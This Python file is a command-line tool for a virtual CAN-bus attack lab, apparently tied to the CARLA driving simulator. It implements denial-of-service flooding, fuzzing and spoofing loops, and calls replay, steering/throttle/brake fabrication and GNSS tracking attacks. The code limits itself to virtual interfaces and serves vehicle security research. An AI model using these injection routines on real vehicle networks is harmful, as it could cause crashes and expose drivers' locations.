import argparse
import can
import sys
import time
import random
import math

from attacks.fake_data_fabrication import run_fabrication_attack
from attacks.replay_attack import run_replay_attack
from attacks.privacy_leakage import run_privacy_leakage_attack, validate_virtual_interface
from attacks.reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER
from can_network import VCAN_CHANNEL, VCAN_ATTACKER_CHANNEL, CAN_INTERFACE

# ---------------------------------------------------------------------------
# Live status display
# ---------------------------------------------------------------------------

_RESET  = "\033[0m"
_RED    = "\033[91m"
_YELLOW = "\033[93m"
_CYAN   = "\033[96m"
_DIM    = "\033[2m"
_SEP    = _DIM + "\u2500" * 44 + _RESET

_status_lines = 0


def _print_status(attack_type: str, feature: str, sent: int, rate: float, last_msg: can.Message):
    global _status_lines
    data_str = " ".join(f"{b:02X}" for b in last_msg.data)
    lines = [
        _SEP,
        f"Attack type : {_RED}{attack_type}{_RESET}",
        f"Feature     : {_YELLOW}{feature}{_RESET}",
        f"Sent        : {_CYAN}{sent}{_RESET}",
        f"Rate        : {_CYAN}{rate:.2f} msg/s{_RESET}",
        f"Last msg    : ID={_CYAN}0x{last_msg.arbitration_id:03X}{_RESET}"
        f"  DLC={last_msg.dlc}"
        f"  DATA={_CYAN}{data_str}{_RESET}",
        _SEP,
    ]
    if _status_lines > 0:
        sys.stdout.write(f"\033[{_status_lines}A")
        for _ in range(_status_lines):
            sys.stdout.write("\033[2K\n")
        sys.stdout.write(f"\033[{_status_lines}A")
    sys.stdout.write("\n".join(lines) + "\n")
    sys.stdout.flush()
    _status_lines = len(lines)


# ---------------------------------------------------------------------------
# Attack functions
# ---------------------------------------------------------------------------

def denial_of_service_func(bus, period: float):
    """Flood the CAN bus with high-priority empty frames at the given period."""
    sent = 0
    t0 = time.monotonic()
    while True:
        msg = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
        bus.send(msg)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        _print_status("Denial of Service", "0x000", sent, sent / elapsed, msg)
        time.sleep(period)


def fuzzy_attack_func(bus):
    """Send random known-valid CAN messages at random intervals."""
    known_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
    sent = 0
    t0 = time.monotonic()
    while True:
        sleep_time = random.uniform(0.5, 1.0)
        attack = random.choice(known_attacks)
        feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[attack]
        msg = can.Message(arbitration_id=feature['id'], data=feature['payload'], is_extended_id=False)
        bus.send(msg)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        _print_status("Fuzzy", attack, sent, sent / elapsed, msg)
        time.sleep(sleep_time)


def spoofing_attacks_func(bus, feature: str, period: float):
    """Continuously inject a spoofed CAN message for the given feature."""
    selected_feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
    sent = 0
    t0 = time.monotonic()
    while True:
        msg = can.Message(arbitration_id=selected_feature['id'], data=selected_feature['payload'], is_extended_id=False)
        bus.send(msg)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        _print_status("Spoofing", feature, sent, sent / elapsed, msg)
        time.sleep(period)


def _parse_can_id(value: str) -> int:
    """Accept conventional hexadecimal (0x602) or decimal (1538) CAN IDs."""
    try:
        can_id = int(value, 0)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(
            f"'{value}' is not a valid decimal or 0x-prefixed CAN ID"
        ) from exc
    if not 0 <= can_id <= 0x1FFFFFFF:
        raise argparse.ArgumentTypeError("CAN ID must be between 0x000 and 0x1FFFFFFF")
    return can_id


def _positive_float(value: str) -> float:
    parsed = float(value)
    if not math.isfinite(parsed) or parsed <= 0:
        raise argparse.ArgumentTypeError("value must be finite and greater than zero")
    return parsed


def _non_negative_float(value: str) -> float:
    parsed = float(value)
    if not math.isfinite(parsed) or parsed < 0:
        raise argparse.ArgumentTypeError("value must be finite and zero or greater")
    return parsed


def _positive_int(value: str) -> int:
    parsed = int(value)
    if parsed < 1:
        raise argparse.ArgumentTypeError("value must be at least one")
    return parsed


def _build_parser(available_features):
    parser = argparse.ArgumentParser(
        description="Perform CAN network attacks in the YES-CARLA-CAN virtual lab.",
        epilog=(
            "Attacker frames are normally sent on vcan1, which bridges to vcan0 "
            "via can-gw. Only the project's virtual interfaces are accepted."
        ),
    )
    parser.add_argument("--feature", choices=available_features, help="Feature or attack to run")
    parser.add_argument(
        "--period",
        type=_positive_float,
        default=0.1,
        help="Period between injected messages in seconds (default: 0.1)",
    )
    parser.add_argument(
        "--duration",
        type=_positive_float,
        default=5.0,
        help="Fabrication/privacy leakage duration in seconds (default: 5)",
    )
    parser.add_argument(
        "--vcan",
        choices=(VCAN_CHANNEL, VCAN_ATTACKER_CHANNEL),
        default=None,
        help=f"Virtual interface (default: {VCAN_CHANNEL} for privacy_leakage; {VCAN_ATTACKER_CHANNEL} for other attacks)",
    )
    parser.add_argument(
        "--dbc",
        default="data/carla.dbc",
        help="DBC used for fabrication or passive GNSS decoding (default: data/carla.dbc)",
    )

    replay_group = parser.add_argument_group("replay attack")
    replay_group.add_argument(
        "--can-id",
        type=_parse_can_id,
        help="CAN ID to capture and replay (hexadecimal such as 0x602 or decimal)",
    )
    replay_group.add_argument(
        "--capture-time",
        type=_positive_float,
        default=5.0,
        help="Capture window in seconds (default: 5)",
    )
    replay_group.add_argument(
        "--delay",
        type=_non_negative_float,
        default=3.0,
        help="Wait between capture and replay in seconds (default: 3)",
    )
    replay_group.add_argument(
        "--repeat",
        type=_positive_int,
        default=1,
        help="Number of times to replay the captured sequence (default: 1)",
    )

    fabrication_group = parser.add_argument_group("fake data fabrication attack")
    fabrication_group.add_argument(
        "--message",
        help="DBC message to fabricate: STEER, THROTTLE, or BRAKE",
    )
    fabrication_group.add_argument(
        "--signal",
        help="DBC signal to fabricate (may be used instead of --message)",
    )
    fabrication_group.add_argument(
        "--value",
        type=float,
        help="Physical signal value to encode using the DBC",
    )
    privacy_group = parser.add_argument_group("C2 passive privacy leakage attack")
    privacy_group.add_argument("--plot", action="store_true", help="Show live GNSS trajectory (privacy_leakage only)")
    privacy_group.add_argument("--output", default="results/privacy_leakage_trace.csv",
                               help="Trajectory CSV path (default: results/privacy_leakage_trace.csv)")
    return parser


def main():
    print("CAN network attacks CLI")
    spoofing_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
    available_features = [
        *spoofing_attacks,
        "fuzzy",
        "denial_of_service",
        "replay",
        "fabrication",
        "privacy_leakage",
    ]

    parser = _build_parser(available_features)
    args = parser.parse_args()
    if not args.feature:
        parser.error("--feature is required")
    if args.vcan is None:
        args.vcan = VCAN_CHANNEL if args.feature == "privacy_leakage" else VCAN_ATTACKER_CHANNEL
    if args.plot and args.feature != "privacy_leakage":
        parser.error("--plot is supported only with --feature privacy_leakage")
    if args.feature == "replay" and args.can_id is None:
        parser.error("--can-id is required when --feature replay is selected")
    if args.feature == "fabrication":
        if args.value is None:
            parser.error("--value is required when --feature fabrication is selected")
        if args.message is None and args.signal is None:
            parser.error(
                "--message, --signal, or both are required when --feature fabrication is selected"
            )

    bus = None
    try:
        if args.feature == "privacy_leakage":
            validate_virtual_interface(args.vcan)
        bus = can.interface.Bus(channel=args.vcan, interface=CAN_INTERFACE)
        if args.feature == "privacy_leakage":
            run_privacy_leakage_attack(
                bus=bus, interface=args.vcan, dbc_path=args.dbc,
                duration=args.duration, output_path=args.output, plot=args.plot,
            )
        elif args.feature == "replay":
            run_replay_attack(
                bus=bus,
                interface=args.vcan,
                target_can_id=args.can_id,
                capture_time=args.capture_time,
                delay=args.delay,
                repetitions=args.repeat,
            )
        elif args.feature == "fabrication":
            run_fabrication_attack(
                bus=bus,
                interface=args.vcan,
                dbc_path=args.dbc,
                message_name=args.message,
                signal_name=args.signal,
                value=args.value,
                period=args.period,
                duration=args.duration,
            )
        elif args.feature == "fuzzy":
            print(f"Starting fuzzy attack…\n")
            fuzzy_attack_func(bus)
        elif args.feature == "denial_of_service":
            print(f"Starting denial-of-service attack (period={args.period}s)…\n")
            denial_of_service_func(bus, args.period)
        else:
            print(f"Starting spoofing attack on '{args.feature}' (period={args.period}s)…\n")
            spoofing_attacks_func(bus, args.feature, args.period)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")
        return 1
    finally:
        if bus is not None:
            bus.shutdown()
    return 0

if __name__ == "__main__":
    sys.exit(main())
